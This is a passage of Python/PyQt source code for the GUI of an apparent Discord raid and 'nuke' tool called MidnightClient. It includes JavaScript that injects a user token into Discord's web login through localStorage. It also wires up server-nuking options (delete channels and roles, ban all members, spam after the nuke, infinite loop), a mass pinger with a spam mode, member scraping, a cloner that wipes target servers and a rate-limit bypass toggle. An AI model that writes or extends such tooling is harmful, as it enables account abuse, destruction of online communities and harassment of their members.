        self.cloner_tab_buttons = QButtonGroup(self)
        self.main_func_tabs_stack = QStackedWidget(self)
        self.updates_tabs_stack = QStackedWidget(self)
        self.commands_tabs_stack = QStackedWidget(self)
        self.cloner_tabs_stack = QStackedWidget(self)
        self.turbo_delay_slider = None
        self.nuclear_msg_count_slider = None
        self.post_nuke_spam_slider = None
        self.webhook_count_slider = None
        self.channel_creation_duration_slider = None
        self.ping_batch_size_slider = None
        self.pings_per_second_slider = None
        self.status_presence_delay_slider = None
        self.logs = None
        self.members_log = None
        self.cloner_logs = None
        self.command_logs = None
        self.selected_pfp_path = None
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setStyleSheet("background: transparent;")
        self.init_ui()
        self.populate_action_names()
        self.log_clear_timer = QTimer(self)
        self.log_clear_timer.timeout.connect(self.clear_all_logs)
        self.log_clear_timer.start(5000)
        self.gui_log_queue = queue.Queue()
        self.gui_update_timer = QTimer(self)
        self.gui_update_timer.timeout.connect(self.process_log_queue_batch)
        self.gui_update_timer.start(100) # Update GUI every 100ms (10 FPS)

    def on_command_execution_finished(self):
        """This slot unlocks the command executor when the background worker is done."""
        self.is_command_executing = False
        self.log("[ℹ️] Command executor is free. Ready for new command.")

    def clear_all_logs(self):
        if self.running_bots:
            return

        if self.logs: self.logs.clear()
        if self.members_log: self.members_log.clear()
        if self.cloner_logs: self.cloner_logs.clear()
        if self.command_logs: self.command_logs.clear()
        self.log("[INFO] Logs cleared automatically.")









    def create_discord_container(self):
        """Creates the container for the Discord web view and the profile switcher."""
        container = QWidget(self)
        layout = QVBoxLayout(container)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        # --- Profile Picture Switcher ---
        self.profile_switcher_scroll_area = QScrollArea()
        self.profile_switcher_scroll_area.setWidgetResizable(True)
        self.profile_switcher_scroll_area.setFixedHeight(70)
        self.profile_switcher_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        self.profile_switcher_scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.profile_switcher_scroll_area.setStyleSheet("background: transparent; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px;")

        switcher_widget = QWidget()
        self.profile_switcher_layout = QHBoxLayout(switcher_widget)
        self.profile_switcher_layout.setContentsMargins(10, 0, 10, 0)
        self.profile_switcher_layout.setSpacing(10)
        self.profile_switcher_layout.setAlignment(Qt.AlignmentFlag.AlignLeft)
        self.profile_switcher_scroll_area.setWidget(switcher_widget)
        layout.addWidget(self.profile_switcher_scroll_area)

        # --- Web View Setup ---
        profile_path = os.path.join(os.getenv('APPDATA'), 'MidnightClient', 'browser_profile')
        self.web_profile = QWebEngineProfile("storage", self)
        self.web_profile.setPersistentStoragePath(profile_path)
        self.web_profile.setHttpUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
        
        self.csp_interceptor = CspInterceptor()
        self.web_profile.setUrlRequestInterceptor(self.csp_interceptor)

        web_page = PermissionAwareWebEnginePage(self.web_profile, self)
        self.web_view = QWebEngineView(self)
        self.web_view.setPage(web_page)
        
        layout.addWidget(self.web_view)
        return container





    def process_log_queue_batch(self):
        """
        Reads all pending log messages from the queue and updates the GUI in ONE go.
        """
        if self.gui_log_queue.empty():
            return

        # Buckets to hold text for each widget
        logs_batch = {
            'main': [],
            'cloner': [],
            'members': [],
            'commands': []
        }

        # Pull EVERYTHING currently in the queue
        while not self.gui_log_queue.empty():
            try:
                target, msg = self.gui_log_queue.get_nowait()
                if target in logs_batch:
                    logs_batch[target].append(msg)
            except queue.Empty:
                break

        # Helper function to append text safely
        def fast_append(widget, text_list):
            if not text_list or not widget: return
            
            # Join all messages with newlines to do ONE update instead of 50
            combined_text = "\n".join(text_list)
            
            # Append text
            cursor = widget.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)
            cursor.insertText(combined_text + "\n")
            widget.setTextCursor(cursor)
            widget.ensureCursorVisible()

            # OPTIONAL: Prevent memory crash by limiting log lines to 2000
            doc = widget.document()
            if doc.blockCount() > 230:
                cursor.movePosition(QTextCursor.MoveOperation.Start)
                for _ in range(doc.blockCount() - 180):
                    cursor.select(QTextCursor.SelectionType.BlockUnderCursor)
                    cursor.removeSelectedText()
                    cursor.deleteChar() 

        # Update widgets
        if logs_batch['main']: fast_append(self.logs, logs_batch['main'])
        if logs_batch['cloner']: fast_append(self.cloner_logs, logs_batch['cloner'])
        if logs_batch['members']: fast_append(self.members_log, logs_batch['members'])
        if logs_batch['commands']: fast_append(self.command_logs, logs_batch['commands'])



    def load_discord(self):
        """Handles the logic for logging into Discord with token injection."""
        if self.injection_attempted:
            return

        if self.is_bot_mode or not self.tokens:
            self.web_view.setHtml("<h1 style='color: white; text-align: center; margin-top: 50px;'>Discord client is disabled for Bot Mode.</h1>")
            return

        token = self.tokens[0]
        self.injection_attempted = True
        self.log("[INFO] Preparing to load Discord with token injection...")

        script_content = f"""
        (function() {{
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            iframe.contentWindow.localStorage.setItem('token', `"{token}"`);
            setTimeout(() => {{
                iframe.remove();
                location.reload();
            }}, 500);
        }})();
        """

        def on_load_finished(ok):
            if "discord.com/login" in self.web_view.url().toString():
                self.log("[INFO] Login page loaded. Injecting token...")
                self.web_view.page().runJavaScript(script_content)
                try:
                    self.web_view.loadFinished.disconnect(on_load_finished)
                except TypeError:
                    pass
        
        try:
            self.web_view.loadFinished.disconnect()
        except TypeError:
            pass
        self.web_view.loadFinished.connect(on_load_finished)
        self.web_view.setUrl(QUrl("https://discord.com/login"))
    








    def log(self, message):
        """
        Thread-safe logging. Pushes message to a queue instead of updating GUI directly.
        This prevents the Main Thread from freezing during high-intensity spam.
        """
        current_time = datetime.now().strftime('%H:%M:%S')
        formatted_message = f"[{current_time}] {message}"

        # Determine target based on running bots
        target = 'main'
        
        # Check running bots to decide where the log goes
        active_bot_types = {type(b) for b in self.running_bots}
        
        if self.command_listener_bot and self.command_listener_bot.isRunning():
             target = 'commands'
        elif CommandActionListener in active_bot_types:
             target = 'commands'
        elif ServerClonerBot in active_bot_types:
             target = 'cloner'
        elif any(isinstance(b, MidnightClientSelfBot) and 
                 b.current_mode in ["member_logger", "ban_from_log", "ping_all", 
                                  "ban_all_server", "ping_all_server", "super_scan_members"] 
                 for b in self.running_bots):
             target = 'members'
        
        # Push to queue: (Target Widget Name, Message)
        self.gui_log_queue.put((target, formatted_message))



    def determine_log_target(self):
        """Determines the correct log widget name based on the currently running bot."""
        if self.command_listener_bot and self.command_listener_bot.running:
            return 'commands'
            
        active_bot_types = {type(b) for b in self.running_bots}
        if ServerClonerBot in active_bot_types:
            return 'cloner'
        
        is_member_op = any(
            hasattr(b, 'current_mode') and b.current_mode in ["member_logger", "ban_from_log", "ping_all", "ban_all_server", "ping_all_server", "super_scan_members"]
            for b in self.running_bots
        )
        if is_member_op:
            return 'members'
            
        return 'main'

    def handle_bot_log(self, message):
        """This slot receives a signal from any bot and routes it to the correct log queue."""
        target = self.determine_log_target()
        self.log(message, target)



    def start_nuke(self):
        """
        Handles the click of the 'NUKE SERVER' button with bot-aware safety checks.
        """
        self.log("--- Executing MainGUI.start_nuke ---")
        self.log(f"Bot mode status (self.is_bot_mode) is: {self.is_bot_mode}")

        # This check is now skipped if self.is_bot_mode is True.
        # Bots can fetch the member list directly from the API and do not need a pre-loaded log file.
        if self.ban_all_check.isChecked() and not self.loaded_member_ids and not self.is_bot_mode:
            CustomMessageBox.warning(self, "Safety Check",
                                "The 'Ban All Members' option is enabled, but no member log has been loaded.\n\n"
                                "Please load a member log file from the 'Members' tab first, or disable the 'Ban All' option to proceed.")
            self.log("[⚠️] Nuke cancelled: 'Ban All' is required but no member log is loaded for user-token mode.")
            return

        # If the safety check passes (or is skipped for bot mode), proceed with the confirmation.
        if not self.confirm_action("nuke"):
            return

        # Call the central bot starter with the "nuke" mode.
        self.start_bot("nuke", initiating_button=self.sender())
    


    def get_valid_server_id(self):
        """
        Validates the Server ID input. 
        Returns the numeric ID if valid, or None if invalid.
        """
        text = self.server_id_input.text().strip()
        
        # 1. Check if it's a recognized server name from the cache
        if text in self.server_name_cache:
            # Return the ID associated with the name
            # The cache stores dicts: {'id': '...', 'icon': '...'}
            return str(self.server_name_cache[text]['id'])
            
        # 2. Check if it is a direct numeric ID
        if text.isdigit():
            if len(text) < 15:
                self.log("[⚠️] Warning: The Server ID looks too short to be valid.")
            return text
            
        # 3. Invalid
        self.log(f"[❌] Invalid Server ID: '{text}'. Please enter a numeric ID or select a valid server name.")
        CustomMessageBox.warning(self, "Invalid Input", 
                                 f"'{text}' is not a valid Server ID.\n\nPlease enter a numeric ID (e.g., 12345...) or select a server from the autofill list.")
        return None
    


    def init_ui(self):
        main_layout = QHBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        side_nav_panel = QFrame(self)
        side_nav_panel.setFixedWidth(200)
        side_nav_panel.setStyleSheet("""
            QFrame {
                background: rgba(26, 32, 44, 0.8);
                border-right: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: inset -5px 0 10px rgba(0, 0, 0, 0.2);
            }
        """)
        side_nav_layout = QVBoxLayout(side_nav_panel)
        side_nav_layout.setContentsMargins(10, 30, 10, 20)
        side_nav_layout.setSpacing(10)
        side_nav_layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignHCenter)

        self.side_nav_button_group.setExclusive(True)

        self.btn_main_functions = SideNavigationButton("Main Functions", self)
        self.side_nav_button_group.addButton(self.btn_main_functions)
        self.btn_main_functions.clicked.connect(lambda: self.switch_main_content("main_functions"))
        side_nav_layout.addWidget(self.btn_main_functions)

        self.btn_updates = SideNavigationButton("Raid Tools", self)
        self.side_nav_button_group.addButton(self.btn_updates)
        self.btn_updates.clicked.connect(lambda: self.switch_main_content("updates"))
        side_nav_layout.addWidget(self.btn_updates)

        self.btn_members = SideNavigationButton("Members", self)
        self.side_nav_button_group.addButton(self.btn_members)
        self.btn_members.clicked.connect(lambda: self.switch_main_content("members"))
        side_nav_layout.addWidget(self.btn_members)

        self.btn_cloner = SideNavigationButton("Cloner", self)
        self.side_nav_button_group.addButton(self.btn_cloner)
        self.btn_cloner.clicked.connect(lambda: self.switch_main_content("cloner"))
        side_nav_layout.addWidget(self.btn_cloner)

        self.btn_ai_chat = SideNavigationButton("AI Companion", self)
        self.side_nav_button_group.addButton(self.btn_ai_chat)
        self.btn_ai_chat.clicked.connect(lambda: self.switch_main_content("ai_chat"))
        side_nav_layout.addWidget(self.btn_ai_chat)

        self.btn_commands = SideNavigationButton("Commands", self)
        self.side_nav_button_group.addButton(self.btn_commands)
        self.btn_commands.clicked.connect(lambda: self.switch_main_content("commands"))
        side_nav_layout.addWidget(self.btn_commands)

        # THIS IS THE SINGLE, CORRECT DISCORD BUTTON
        self.btn_discord = SideNavigationButton("Discord", self)
        self.side_nav_button_group.addButton(self.btn_discord)
        self.btn_discord.clicked.connect(lambda: self.switch_main_content("discord"))
        side_nav_layout.addWidget(self.btn_discord)

        self.btn_settings = SideNavigationButton("Settings", self)
        self.side_nav_button_group.addButton(self.btn_settings)
        self.btn_settings.clicked.connect(lambda: self.switch_main_content("settings"))
        side_nav_layout.addWidget(self.btn_settings)

        side_nav_layout.addStretch()

        self.content_stack = QStackedWidget(self)
        self.content_stack.setStyleSheet("background: transparent;")

        self.main_functions_container = self.create_main_functions_container()
        self.updates_container = self.create_updates_container()
        self.members_container = self.create_members_container()
        self.cloner_container = self.create_cloner_container()
        self.ai_chat_container = self.create_ai_chat_container()
        self.discord_container = self.create_discord_container()
        self.settings_content_widget = self.create_settings_widget()
        self.commands_container = self.create_commands_container()

        self.content_stack.addWidget(self.main_functions_container)
        self.content_stack.addWidget(self.updates_container)
        self.content_stack.addWidget(self.members_container)
        self.content_stack.addWidget(self.cloner_container)
        self.content_stack.addWidget(self.ai_chat_container)
        self.content_stack.addWidget(self.discord_container)
        self.content_stack.addWidget(self.commands_container)
        self.content_stack.addWidget(self.settings_content_widget)

        main_layout.addWidget(side_nav_panel)
        main_layout.addWidget(self.content_stack)

        self.btn_main_functions.setChecked(True)
        self.content_stack.setCurrentWidget(self.main_functions_container)


    # In the MainGUI class, replace get_current_bot_options with this:
    def get_current_bot_options(self):
        """
        Gathers all current settings from the GUI widgets.
        Now called from a background thread, so i
        t's safe to include large lists.
        """
         # --- FIX: Resolve Name to ID here ---
        raw_server_text = self.server_id_input.text().strip()
        final_server_id = raw_server_text

                # Check if the text matches a name in our cache
        if raw_server_text in self.server_name_cache:
            final_server_id = str(self.server_name_cache[raw_server_text]['id'])
        # ------------------------------------


        options = {
            'server_id': self.server_id_input.text().strip(),
            
            'channel_id': self.channel_id_input.text().strip(),
            'messages': [line.strip() for line in self.message_input.toPlainText().split('\n') if line.strip()],
            'random_messages': self.random_message_check.isChecked(),
            'custom_server_name': self.custom_server_name_input.text().strip(),
            'server_id': final_server_id, # <--- Use the resolved ID
            'custom_member_limit': 0,  # Default to 0, the popup will override this later
            'use_single_thread': self.single_thread_mode_check.isChecked(), # <--- ADD THIS LINE
            'use_high_threads': self.high_thread_count_check.isChecked(),
            'use_custom_threads': self.custom_threads_check.isChecked(), # <--- ADDED
            'custom_thread_count': self.custom_threads_input.value(),    # <--- ADDED
            'use_low_threads': self.low_thread_count_check.isChecked(),
            'use_legacy_fetch': False,

            'custom_channel_name': self.custom_channel_name_input.text().strip(),
            
            # --- FIX START: Hardcode this to False to remove the error ---
            'use_legacy_fetch': False, 
            # --- FIX END ---

            'server_pfp_path': self.selected_pfp_path,
            'destruction_options': {
                "delete_channels": self.delete_channels_check.isChecked(),
                "create_spam": self.create_spam_check.isChecked(),
                "create_6_channels": self.create_6_channels_check.isChecked(),
                "delete_roles": self.delete_roles_check.isChecked(),
                "delete_webhooks": self.delete_webhooks_check.isChecked(),
                "rename_server": self.rename_server_check.isChecked(),
                "spam_all_channels_post_nuke": self.spam_all_post_nuke_check.isChecked(),
                "use_webhook_ping": self.use_webhook_ping_check.isChecked(),
                "infinite_loop": self.infinite_loop_check.isChecked(),
                "give_all_other_tokens_best_role": self.give_all_other_tokens_best_role_check.isChecked(),
                "ban_all_enabled": self.ban_all_check.isChecked(),
                "spam_on_create": self.spam_on_create_check.isChecked(),
            },
            'channel_creation_duration': self.channel_creation_duration_slider.value(),
            'post_nuke_spam_count': self.post_nuke_spam_slider.value(),
            'turbo_delay': self.turbo_delay_slider.value(),
            'nuclear_message_count': self.nuclear_msg_count_slider.value(),
            'reaction_channel_id': self.reaction_channel_id_input.text().strip(),
            'reaction_message_id': self.reaction_message_id_input.text().strip(),
            'role_name': self.role_name_input.text(),
            'webhook_spam_count': self.webhook_count_slider.value(),
            'webhook_single_channel_mode': self.webhook_single_channel_check.isChecked(),
            'webhook_target_channel_id': self.webhook_target_channel_id_input.text().strip(),
            'webhook_message': self.webhook_message_input.text(),
            'status_texts': [
                line.strip() for line in self.status_text_input.toPlainText().split('\n') if line.strip()
            ],
            'status_delay': self.status_delay_slider.value(),
            'cycle_presence': self.status_cycle_presence_check.isChecked(),
            'presence_list': [
                cb.text().lower()
                for cb in self.status_presence_group.findChildren(QCheckBox)
                if cb.isChecked() and cb.text() != 'Enable Presence Cycling'
            ],
            'presence_delay': self.status_presence_delay_slider.value(),
            'status_emoji_server_id': self.status_emoji_server_id_input.text().strip(),
            'ban_user_ids_from_file': self.loaded_member_ids,
            'ping_user_ids': self.loaded_member_ids,
            'pings_per_batch': self.ping_batch_size_slider.value(),
            'pings_per_second_limit': self.pings_per_second_slider.value(),
            'invalidate_dead_tokens': self.invalidate_tokens_check.isChecked(),
            'dead_token_retry_delay': self.dead_token_retry_input.value()
        }



        if self.bypass_rate_limits_check:
            options['bypass_rate_limits'] = self.bypass_rate_limits_check.isChecked()

        return options








    def switch_main_content(self, target_name: str):
        main_window = self.window()
        
        # --- Window Resizing Logic (MODIFIED) ---
        # Check if window size locking is enabled
        is_size_locked = False
        if hasattr(self, 'lock_window_size_check') and self.lock_window_size_check.isChecked():
            is_size_locked = True

        if target_name == "discord":
            # Only resize if:
            # 1. It's not currently active
            # 2. Size Locking is OFF
            if not main_window.is_discord_tab_active and not is_size_locked:
                large_size = QSize(int(main_window.original_size.width() * 1.5), int(main_window.original_size.height() * 1.5))
                main_window.animate_window_resize(large_size)
                main_window.is_discord_tab_active = True
        
        elif main_window.is_discord_tab_active:
            # If we are leaving Discord tab, and it WAS active (meaning it was resized), shrink it back.
            main_window.animate_window_resize(main_window.original_size)
            main_window.is_discord_tab_active = False

        # --- Tab Selection and Animation Logic ---
        current_widget = self.content_stack.currentWidget()
        target_widget_to_show = None

        widget_map = {
            "main_functions": self.main_functions_container,
            "updates": self.updates_container,
            "members": self.members_container,
            "cloner": self.cloner_container,
            "ai_chat": self.ai_chat_container,
            "discord": self.discord_container,
            "commands": self.commands_container,
            "settings": self.settings_content_widget,
        }
        target_widget_to_show = widget_map.get(target_name)

        if not target_widget_to_show or current_widget == target_widget_to_show:
            return

        # Trigger Discord loading AFTER the tab has been selected
        if target_name == "discord":
            self.load_discord()

        # Performance mode check for animations
        if self.performance_mode_check and self.performance_mode_check.isChecked():
            self.content_stack.setCurrentWidget(target_widget_to_show)
            return

        direction = 1 if self.content_stack.indexOf(target_widget_to_show) > self.content_stack.indexOf(current_widget) else -1

        target_widget_to_show.show()
        target_widget_to_show.setGeometry(0, 0, self.content_stack.width(), self.content_stack.height())
        target_widget_to_show.move(direction * self.content_stack.width(), 0)

        anim_current = QPropertyAnimation(current_widget, b"pos", self)
        anim_current.setDuration(300)
        anim_current.setEasingCurve(QEasingCurve.Type.OutCubic)
        anim_current.setStartValue(QPoint(0, 0))
        anim_current.setEndValue(QPoint(-direction * self.content_stack.width(), 0))
        anim_current.finished.connect(current_widget.hide)

        anim_next = QPropertyAnimation(target_widget_to_show, b"pos", self)
        anim_next.setDuration(300)
        anim_next.setEasingCurve(QEasingCurve.Type.OutCubic)
        anim_next.setStartValue(QPoint(direction * self.content_stack.width(), 0))
        anim_next.setEndValue(QPoint(0, 0))

        self.content_stack.setCurrentWidget(target_widget_to_show)
        anim_current.start()
        anim_next.start()




    def create_members_container(self):
        container = QWidget(self)
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(20, 20, 20, 20)
        container_layout.setSpacing(15)

        # --- Header ---
        title = QLabel("Member Management")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: white; font-size: 20px; font-weight: bold;")
        container_layout.addWidget(title)

        self.member_status_label = QLabel("Status: Idle")
        self.member_status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.member_status_label.setStyleSheet("color: #A0AEC0; font-size: 14px;")
        container_layout.addWidget(self.member_status_label)

        # --- GROUP 1: Scanning & Data ---
        scan_group = QGroupBox("Scanning/Data Actions")
        scan_group.setStyleSheet("""
            QGroupBox { color: white; font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }
        """)
        scan_layout = QGridLayout(scan_group)
        scan_layout.setHorizontalSpacing(15)
        scan_layout.setVerticalSpacing(15)

        # Row 0: Scanners
        self.fetch_log_btn = MinimalButton("Normal Scan (Legacy)")
        self.fetch_log_btn.setToolTip("Scans using letters/numbers queries.")
        self.fetch_log_btn.clicked.connect(self.start_member_logger)
        
        self.super_scan_btn = MinimalButton("Super Scan Members")
        self.super_scan_btn.setToolTip("Scans using channel member list chunks (Recommended).")
        self.super_scan_btn.setStyleSheet("""
            QPushButton { background: rgba(99, 179, 237, 0.1); border: 1px solid rgba(99, 179, 237, 0.5); color: white; }
            QPushButton:hover { background: rgba(99, 179, 237, 0.2); }
        """)
        self.super_scan_btn.clicked.connect(self.start_super_scan_members)

        # Row 1: File & Ban
        self.load_log_btn = MinimalButton("Load Member File")
        self.load_log_btn.clicked.connect(self.load_member_log)

        self.ban_from_log_btn = MinimalButton("Ban Loaded IDs")
        self.ban_from_log_btn.setEnabled(False)
        # FIX: Defined styles for BOTH Disabled and Enabled states
        self.ban_from_log_btn.setStyleSheet("""
            QPushButton { 
                background: rgba(200, 50, 50, 0.2); 
                border: 1px solid rgba(200, 50, 50, 0.6); 
                color: #ffcccc; 
            }
            QPushButton:hover { 
                background: rgba(200, 50, 50, 0.3); 
                color: white;
            }
            QPushButton:disabled { 
                background: rgba(255, 255, 255, 0.05); 
                border: 1px solid rgba(255, 255, 255, 0.1); 
                color: #555; 
            }
        """)
        self.ban_from_log_btn.clicked.connect(self.start_ban_from_log)

        # Add to Grid
        scan_layout.addWidget(self.fetch_log_btn, 0, 0)
        scan_layout.addWidget(self.super_scan_btn, 0, 1)
        scan_layout.addWidget(self.load_log_btn, 1, 0)
        scan_layout.addWidget(self.ban_from_log_btn, 1, 1)

        container_layout.addWidget(scan_group)

        # --- GROUP 2: Mass Pinger ---
        ping_group = QGroupBox("Mass Pinger Configuration")
        ping_group.setStyleSheet(scan_group.styleSheet())
        ping_layout = QVBoxLayout(ping_group)
        ping_layout.setSpacing(10)

        # Slider 1: Batch Size
        batch_layout = QHBoxLayout()
        batch_lbl = QLabel("Pings per Message:")
        batch_lbl.setStyleSheet("color: white; font-size: 12px;")
        
        self.ping_batch_size_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.ping_batch_size_slider.setRange(1, 90)
        self.ping_batch_size_slider.setValue(42)
        
        self.ping_batch_size_value_label = QLabel("42")
        self.ping_batch_size_value_label.setFixedWidth(30)
        self.ping_batch_size_value_label.setAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
        self.ping_batch_size_value_label.setStyleSheet("color: white; font-size: 12px;")
        
        self.ping_batch_size_slider.valueChanged.connect(lambda v: self.ping_batch_size_value_label.setText(str(v)))
        
        batch_layout.addWidget(batch_lbl)
        batch_layout.addWidget(self.ping_batch_size_slider)
        batch_layout.addWidget(self.ping_batch_size_value_label)
        ping_layout.addLayout(batch_layout)

        # Slider 2: Speed
        speed_layout = QHBoxLayout()
        speed_lbl = QLabel("Speed (Batches/sec):")
        speed_lbl.setStyleSheet("color: white; font-size: 12px;")
        
        self.pings_per_second_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.pings_per_second_slider.setRange(1, 50)
        self.pings_per_second_slider.setValue(10)
        
        self.pings_per_second_value_label = QLabel("10")
        self.pings_per_second_value_label.setFixedWidth(30)
        self.pings_per_second_value_label.setAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
        self.pings_per_second_value_label.setStyleSheet("color: white; font-size: 12px;")
        
        self.pings_per_second_slider.valueChanged.connect(lambda v: self.pings_per_second_value_label.setText(str(v)))
        
        speed_layout.addWidget(speed_lbl)
        speed_layout.addWidget(self.pings_per_second_slider)
        speed_layout.addWidget(self.pings_per_second_value_label)
        ping_layout.addLayout(speed_layout)

        # Ping Buttons
        ping_btn_layout = QHBoxLayout()
        self.ping_all_batch_btn = MinimalButton("Ping (Batch Mode)")
        self.ping_all_batch_btn.setEnabled(False)
        self.ping_all_batch_btn.clicked.connect(self.start_ping_all_batch)
        
        self.ping_all_spam_btn = MinimalButton("Ping (Spam Mode)")
        self.ping_all_spam_btn.setEnabled(False)
        self.ping_all_spam_btn.clicked.connect(self.start_ping_spam)

        ping_btn_layout.addWidget(self.ping_all_batch_btn)
        ping_btn_layout.addWidget(self.ping_all_spam_btn)
        ping_layout.addLayout(ping_btn_layout)

        container_layout.addWidget(ping_group)

        # --- Logs ---
        logs_label = QLabel("Logs:")
        logs_label.setStyleSheet("color: white; font-size: 12px;")
        container_layout.addWidget(logs_label)
        
        self.members_log = ModernTextEdit(self)
        self.members_log.setReadOnly(True)
        container_layout.addWidget(self.members_log)

        return container
    def create_cloner_container(self):
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QHBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addStretch(1)

        container = QWidget(outer_container)
        container.setMinimumSize(600, 400)
        container.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Expanding)
        container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)

        section_title = QLabel("Server Cloner", container)
        section_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        section_title.setStyleSheet(
            "color: white; font-size: 20px; font-weight: bold; padding: 15px; background: rgba(26, 32, 44, 0.7); border-top-left-radius: 15px; border-top-right-radius: 15px; margin-bottom: 0px;")
        container_layout.addWidget(section_title)

        tab_buttons_layout = QHBoxLayout()
        tab_buttons_layout.setContentsMargins(20, 0, 20, 0)
        tab_buttons_layout.setSpacing(5)
        tab_buttons_layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

        self.cloner_tab_buttons.setExclusive(True)
        self.cloner_tabs_stack.setStyleSheet("""
            QStackedWidget {
                background: rgba(26, 32, 44, 0.7); border: 1px solid rgba(255, 255, 255, 0.1);
                border-top-right-radius: 15px; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;
                margin-top: 0px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
            }
        """)

        tab_names = ["Setup/Actions", "Logs"]
        for i, name in enumerate(tab_names):
            tab_button = TabButton(name, container)
            tab_button.clicked.connect(lambda checked, index=i: self.switch_sub_tab(self.cloner_tabs_stack, index))
            tab_buttons_layout.addWidget(tab_button)
            self.cloner_tab_buttons.addButton(tab_button, i)

        self.cloner_tabs_stack.addWidget(self.create_cloner_setup_tab())
        self.cloner_tabs_stack.addWidget(self.create_cloner_logs_tab())

        tab_buttons_layout.addStretch(1)
        container_layout.addLayout(tab_buttons_layout)
        container_layout.addWidget(self.cloner_tabs_stack)

        outer_layout.addWidget(container)
        outer_layout.addStretch(1)

        self.cloner_tab_buttons.button(0).setChecked(True)
        self.cloner_tabs_stack.setCurrentIndex(0)

        return outer_container


    def create_cloner_setup_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        
        # Main Vertical Layout
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        # =================================================
        # 1. SERVER CONFIGURATION (Top Section)
        # =================================================
        server_config_layout = QHBoxLayout()
        server_config_layout.setSpacing(15)

        # --- CARD 1: SOURCE SERVER (Left) ---
        source_frame = QFrame()
        source_frame.setStyleSheet("""
            QFrame { 
                background: rgba(0, 0, 0, 0.25); 
                border: 1px solid rgba(255, 255, 255, 0.1); 
                border-radius: 12px; 
            }
        """)
        source_layout = QVBoxLayout(source_frame)
        source_layout.setContentsMargins(20, 20, 20, 20)
        
        lbl_source = QLabel("FROM: Source Server")
        lbl_source.setStyleSheet("color: #A0AEC0; font-weight: bold; font-size: 12px; border: none; background: transparent;")
        
        self.cloner_source_id_input = ModernLineEdit()
        self.cloner_source_id_input.setPlaceholderText("Paste Source Guild ID...")
        
        self.log_server_btn = MinimalButton(" Clone/Log Server")
        self.log_server_btn.setToolTip("Scrape the layout of the source server.")
        self.log_server_btn.clicked.connect(self.start_cloner_log)
        self.log_server_btn.setStyleSheet("""
            QPushButton { background: rgba(66, 153, 225, 0.2); border: 1px solid rgba(66, 153, 225, 0.5); color: white; }
            QPushButton:hover { background: rgba(66, 153, 225, 0.3); }
        """)

        source_layout.addWidget(lbl_source)
        source_layout.addWidget(self.cloner_source_id_input)
        source_layout.addWidget(self.log_server_btn)
        source_layout.addStretch()

        # --- VISUAL SEPARATOR (Arrow) ---
        arrow_label = QLabel("➜")
        arrow_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        arrow_label.setStyleSheet("color: rgba(255, 255, 255, 0.3); font-size: 30px; font-weight: bold;")

        # --- CARD 2: TARGET SERVER (Right) ---
        target_frame = QFrame()
        target_frame.setStyleSheet(source_frame.styleSheet())
        target_layout = QVBoxLayout(target_frame)
        target_layout.setContentsMargins(20, 20, 20, 20)
        
        lbl_target = QLabel("TO: Target Server")
        lbl_target.setStyleSheet("color: #A0AEC0; font-weight: bold; font-size: 12px; border: none; background: transparent;")
        
        self.cloner_target_id_input = ModernLineEdit()
        self.cloner_target_id_input.setPlaceholderText("Paste Target Guild ID...")
        
        target_info = QLabel("This server will be wiped and overwritten.")
        target_info.setWordWrap(True)
        target_info.setStyleSheet("color: #718096; font-size: 11px; font-style: italic; border: none; background: transparent;")

        target_layout.addWidget(lbl_target)
        target_layout.addWidget(self.cloner_target_id_input)
        target_layout.addWidget(target_info)
        target_layout.addStretch()

        # Add cards to layout
        server_config_layout.addWidget(source_frame)
        server_config_layout.addWidget(arrow_label)
        server_config_layout.addWidget(target_frame)
        
        layout.addLayout(server_config_layout)

        # =================================================
        # 2. DATA MANAGEMENT (Middle Bar)
        # =================================================
        data_frame = QFrame()
        data_frame.setStyleSheet("""
            QFrame { background: rgba(255, 255, 255, 0.05); border-radius: 8px; }
        """)
        data_layout = QHBoxLayout(data_frame)
        data_layout.setContentsMargins(15, 10, 15, 10)
        
        data_lbl = QLabel("Layout Config:")
        data_lbl.setStyleSheet("color: white; font-weight: bold; background: transparent;")
        
        self.save_log_btn = MinimalButton("Save Layout")
        self.save_log_btn.setFixedHeight(35)
        self.save_log_btn.clicked.connect(self.save_clone_log)
        
